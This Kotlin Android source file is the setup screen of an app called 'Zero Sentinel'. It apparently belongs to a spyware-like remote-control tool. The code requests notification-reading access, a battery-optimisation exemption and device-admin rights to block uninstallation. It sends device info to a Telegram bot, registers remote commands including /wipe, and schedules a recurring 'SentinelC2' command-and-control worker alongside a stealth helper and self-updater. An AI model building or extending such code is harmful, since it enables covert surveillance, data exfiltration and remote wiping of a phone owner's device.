package com.zero.sentinel.ui

import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import com.zero.sentinel.R


import android.content.ComponentName
import android.content.pm.PackageManager
import android.net.Uri
import android.os.PowerManager
import android.view.View
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.NetworkType
import androidx.work.Constraints
import androidx.work.WorkManager
import androidx.work.ExistingPeriodicWorkPolicy
import java.util.concurrent.TimeUnit
import com.zero.sentinel.workers.C2Worker
import com.zero.sentinel.utils.StealthManager
import com.zero.sentinel.network.TelegramClient
import com.zero.sentinel.utils.DeviceInfoHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    private lateinit var adminButton: Button
    private lateinit var statusText: TextView
    private lateinit var enableButton: Button
    private lateinit var batteryButton: Button

    private lateinit var checkUpdateButton: Button
    private lateinit var setPinButton: Button
    private lateinit var botTokenInput: EditText
    private lateinit var chatIdInput: EditText
    private lateinit var saveButton: Button
    private lateinit var testButton: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        statusText = findViewById(R.id.tv_status)
        enableButton = findViewById(R.id.btn_enable_accessibility)
        enableButton.text = "1. Enable Notification Access"
        
        batteryButton = findViewById(R.id.btn_ignore_battery)
        adminButton = findViewById(R.id.btn_enable_admin) // Bind
        botTokenInput = findViewById(R.id.et_bot_token)
        chatIdInput = findViewById(R.id.et_chat_id)
        saveButton = findViewById(R.id.btn_save_connection)
        testButton = findViewById(R.id.btn_test_connection)
        setPinButton = findViewById(R.id.btn_set_password)
        checkUpdateButton = findViewById(R.id.btn_check_update) 
        
        val prefsManager = com.zero.sentinel.data.EncryptedPrefsManager(this)

        setPinButton.setOnClickListener {
            showSetPinDialog(prefsManager)
        }

        // Check for Update
        checkUpdateButton.setOnClickListener {
            Toast.makeText(this, "Checking for updates...", Toast.LENGTH_SHORT).show()
            val updater = com.zero.sentinel.network.GithubUpdater(this)
            CoroutineScope(Dispatchers.IO).launch {
                updater.checkAndInstallUpdate()
            }
        }

        // Load existing
        botTokenInput.setText(prefsManager.getBotToken())
        chatIdInput.setText(prefsManager.getChatId())
        // ... (rest of the file)

        // Save Connection
        saveButton.setOnClickListener {
            val token = botTokenInput.text.toString()
            val chat = chatIdInput.text.toString()
            
            if (token.isNotEmpty() && chat.isNotEmpty()) {
                prefsManager.saveBotToken(token)
                prefsManager.saveChatId(chat)
                Toast.makeText(this, "Credentials Saved!", Toast.LENGTH_SHORT).show()
                // Restart Service to pick up new creds
                // Schedule C2 Worker
                val workRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
                    .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
                    .build()
                WorkManager.getInstance(this).enqueueUniquePeriodicWork(
                    "SentinelC2",
                    ExistingPeriodicWorkPolicy.UPDATE,
                    workRequest
                )
            } else {
                Toast.makeText(this, "Please enter both Token and Chat ID", Toast.LENGTH_SHORT).show()
            }
        }

        // Test Connection
        testButton.setOnClickListener {
            Log.d("MainActivity", "Test Connection button clicked")
            val token = botTokenInput.text.toString()
            val chat = chatIdInput.text.toString()

            if (token.isNotEmpty() && chat.isNotEmpty()) {
                prefsManager.saveBotToken(token)
                prefsManager.saveChatId(chat)
                
                Toast.makeText(this, "Sending Device Info...", Toast.LENGTH_SHORT).show()
                
                val client = TelegramClient(this)
                val info = DeviceInfoHelper.getDeviceInfo()
                
                CoroutineScope(Dispatchers.IO).launch {
                    Log.d("MainActivity", "Verifying token...")
                    val botInfo = client.testToken()
                    
                    if (botInfo != null) {
                        Log.d("MainActivity", "Token OK. Sending test message...")
                        client.sendMessage("🔔 *TEST CONNECTION*\n\n$info")
                        
                        // Register Commands
                        val cmdSuccess = client.setMyCommands()
                        if (cmdSuccess) {
                             launch(Dispatchers.Main) {
                                 Toast.makeText(this@MainActivity, "Commands Registered!", Toast.LENGTH_SHORT).show()
                             }
                             client.sendMessage("✅ *Commands Registered*: /ping, /wipe, /setpin")
                        }
                    } else {
                        Log.e("MainActivity", "Token Verification FAILED. Check Bot Token.")
                        launch(Dispatchers.Main) {
                            Toast.makeText(this@MainActivity, "Connection Failed", Toast.LENGTH_SHORT).show()
                        }
                    }
                }
            } else {            
                Log.w("MainActivity", "Test Connection failed: Token or Chat ID empty")
                Toast.makeText(this, "Please enter both Token and Chat ID", Toast.LENGTH_SHORT).show()
            }
        }

        // 1. Notification Access
        enableButton.setOnClickListener {
            if (!isNotificationServiceEnabled()) {
                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                startActivity(intent)
                
                Toast.makeText(this, "Find 'Zero Sentinel' and enable it.", Toast.LENGTH_LONG).show()
            }
        }

        // 2. Battery Optimization
        batteryButton.setOnClickListener {
            requestBatteryOptimization()
        }



        // 4. Admin Protection
        adminButton.setOnClickListener {
            showAdminDialog()
        }
        
        // Start Foreground Service immediately if possible
        // Schedule C2 Worker on startup if configured
        val workRequest = PeriodicWorkRequestBuilder<C2Worker>(15, TimeUnit.MINUTES)
            .setConstraints(Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build())
            .build()
        WorkManager.getInstance(this).enqueueUniquePeriodicWork(
            "SentinelC2",
            ExistingPeriodicWorkPolicy.KEEP,
            workRequest
        )
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
    }

    private fun updateStatus() {
        // Check Notification Access
        if (isNotificationServiceEnabled()) {
            enableButton.isEnabled = false
            enableButton.text = "Access Granted ✅"
        } else {
            enableButton.isEnabled = true
        }

        // Check Battery
        if (isIgnoringBatteryOptimizations()) {
            batteryButton.isEnabled = false
            batteryButton.text = "Battery Ignored ✅"
        } else {
            batteryButton.isEnabled = true
        }

        // Check Admin
        if (isAdminActive()) {
            adminButton.isEnabled = false
            adminButton.text = "Protection Active ✅"
        } else {
            adminButton.isEnabled = true
        }

        statusText.text = "Setup Status: ${if (enableButton.isEnabled || adminButton.isEnabled) "Incomplete" else "Ready"}"
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val packageName = packageName
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat?.contains(packageName) == true
    }

    private fun isIgnoringBatteryOptimizations(): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        return pm.isIgnoringBatteryOptimizations(packageName)
    }

    private fun requestBatteryOptimization() {
        if (!isIgnoringBatteryOptimizations()) {
            val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        }
    }



    private fun showAdminDialog() {
         val componentName = android.content.ComponentName(this, com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java)
         val intent = Intent(android.app.admin.DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
         intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
         intent.putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Protects the app from unauthorized uninstallation.")
         startActivity(intent)
    }

    private fun isAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val componentName = android.content.ComponentName(this, com.zero.sentinel.receivers.SentinelDeviceAdminReceiver::class.java)
        return dpm.isAdminActive(componentName)
    }

    private fun showSetPinDialog(prefs: com.zero.sentinel.data.EncryptedPrefsManager) {
        val layout = android.widget.LinearLayout(this)
        layout.orientation = android.widget.LinearLayout.VERTICAL
        layout.setPadding(50, 40, 50, 10)
        
        val input1 = EditText(this)
        input1.hint = "New 6-digit PIN"
        input1.inputType = android.text.InputType.TYPE_CLASS_NUMBER or android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
        input1.filters = arrayOf(android.text.InputFilter.LengthFilter(6))
        layout.addView(input1)
        
        val input2 = EditText(this)
        input2.hint = "Confirm PIN"
        input2.inputType = android.text.InputType.TYPE_CLASS_NUMBER or android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
        input2.filters = arrayOf(android.text.InputFilter.LengthFilter(6))
        layout.addView(input2)

        androidx.appcompat.app.AlertDialog.Builder(this)
            .setTitle("Set App PIN")
            .setView(layout)
            .setPositiveButton("Save") { _, _ ->
                val p1 = input1.text.toString()
                val p2 = input2.text.toString()
                
                if (p1.length == 6 && p1 == p2) {
                    prefs.saveAppPassword(p1)
                    Toast.makeText(this, "PIN Set!", Toast.LENGTH_SHORT).show()
                } else {
                    Toast.makeText(this, "PIN must be 6 digits and match", Toast.LENGTH_LONG).show()
                }
            }
            .setNegativeButton("Cancel", null)
            .show()
    }
}
